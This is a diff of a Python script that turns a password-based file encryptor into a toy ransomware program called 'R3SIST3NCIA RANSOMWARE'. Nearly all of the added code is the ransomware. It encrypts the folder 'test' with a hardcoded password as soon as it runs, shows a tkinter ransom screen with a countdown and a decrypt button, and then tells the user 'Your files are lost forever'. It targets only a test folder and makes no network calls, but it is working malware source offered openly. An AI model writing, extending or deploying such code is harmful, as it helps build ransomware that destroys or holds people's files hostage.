@@ -3,7 +3,9 @@ import secrets
 import os
 import base64
 import getpass
+import time
 from pathlib import Path
+import tkinter as tk
 
 import cryptography
 from cryptography.fernet import Fernet
@@ -23,15 +25,6 @@ def derive_key(salt, password):
 
 def load_salt():
     return open("salt.salt", "rb").read()
-
-
-# TODO: usar isto para as funções de encriptar/desencriptar pastas
-def scan(base_dir):
-    for entry in os.scandir(base_dir):
-        if entry.is_file():
-            yield entry
-        else:
-            yield from scan(entry.path)
 
 
 def generate_key(password, salt_size=16, load_existing_salt=False, save_salt=True):
@@ -81,8 +74,8 @@ def decrypt(filename, key):
         file.write(decrypted_data)
 
 
-def decrypt_folder(folder_name, key):
-    for child in pathlib.Path(folder_name).glob("*"):
+def decrypt_folder(path_to_folder, key):
+    for child in pathlib.Path(path_to_folder).glob("*"):
         if child.is_file():
             print(f"[*] Decrypting {child}")
             decrypt(child, key)
@@ -90,37 +83,76 @@ def decrypt_folder(folder_name, key):
             decrypt_folder(child, key)
 
 
-if __name__ == "__main__":
-    import argparse
-    parser = argparse.ArgumentParser(description="File Encryptor Script with a Password")
-    parser.add_argument("path", help="Path to encrypt/decrypt, can be a file or an entire folder.")
-    parser.add_argument("-s", "--salt-size", help="If this is a set, a new salt with the passed size is generated.", type=int)
-    parser.add_argument("-e", "--encrypt", action="store_true", help="Encrypt the file/folder, only -e or -d.")
-    parser.add_argument("-d", "--decrypt", action="store_true", help="Decrypt the file/folder, only -e or -d.")
+def countdown(count):
+    hour, minute, second = count.split(":")
+    hour = int(hour)
+    minute = int(minute)
+    second = int(second)
 
-    args = parser.parse_args()
-    if args.encrypt or args.decrypt:
-        password = getpass.getpass("Password: ")
+    label['text'] = '{}:{}:{}'.format(hour, minute, second)
 
-    if args.salt_size:
-        key = generate_key(password, salt_size=args.salt_size, save_salt=True)
+    if second > 0 or minute > 0 or hour > 0:
+        if second > 0:
+            second -= 1
+        elif minute > 0:
+            minute -= 1
+            second = 59
+        elif hour > 0:
+            hour -= 1
+            minute = 59
+            second = 59
     else:
-        key = generate_key(password, load_existing_salt=True)
+        root.destroy()
+        return
 
-    encrypt_ = args.encrypt
-    decrypt_ = args.decrypt
+    root.after(1000, countdown, '{}:{}:{}'.format(hour, minute, second))
 
-    if encrypt_ and decrypt_:
-        raise TypeError("Please specify whether you want to encrypt or decrypt the file/directory.")
-    elif encrypt_:
-        if os.path.isfile(args.path):
-            encrypt(args.path, key)
-        elif os.path.isdir(args.path):
-            encrypt_folder(args.path, key)
-    elif decrypt_:
-        if os.path.isfile(args.path):
-            decrypt(args.path, key)
-        elif os.path.isdir(args.path):
-            decrypt_folder(args.path, key)
-    else:
-        raise TypeError("Please specify whether you want to encrypt or decrypt the file/directory.")
+def encrypt_files():
+    encrypt_folder('test', generate_key('1234', salt_size=32, save_salt=True))
+
+
+def decrypt_files():
+    decrypt_folder('test', generate_key('1234', load_existing_salt=True))
+    root.destroy()
+
+    good = tk.Tk()
+    good.title('Good for you')
+    good.geometry('300x50')
+    good.resizable(False, False)
+    tk.Label(good, text='Your files have been decrypted... yay.', font=('calibri', 12, 'bold')).pack()
+    good.after(5000, good.destroy)
+    good.mainloop()
+
+    quit()
+
+
+encrypt_files()
+
+res = """
+  ___ _______ ___ ___ _____ _____  _  ___ ___   _   
+ | _ |__ / __|_ _/ __|_   _|__ | \| |/ __|_ _| /_\  
+ |   /|_ \__ \| |\__ \ | |  |_ | .` | (__ | | / _ \ 
+  |_|_|___|___|___|___/ |_| |___|_|\_|\___|___/_/ \_\ """
+
+root = tk.Tk()
+root.title('R3SIST3NCIA RANSOMWARE')
+root.geometry('500x300')
+root.resizable(False, False)
+tk.Label(root, text=res, font=('consolas', 12)).pack()
+tk.Label(root, text="Your files have been encrypted :D",  font=('calibri', 12,'bold')).pack()
+label = tk.Label(root, font=('calibri', 50, 'bold'), fg='black', bg='red')
+label.pack()
+w = tk.Button(root, text='Decrypt Files', command=decrypt_files)
+w.pack(side='bottom')
+
+countdown('00:00:01')
+root.mainloop()
+
+
+bye = tk.Tk()
+bye.title('HAHAHA')
+bye.geometry('300x50')
+bye.resizable(False, False)
+tk.Label(bye, text='Your files are lost forever... :D byeee', font=('calibri', 12,'bold')).pack()
+bye.after(5000, bye.destroy)
+bye.mainloop()
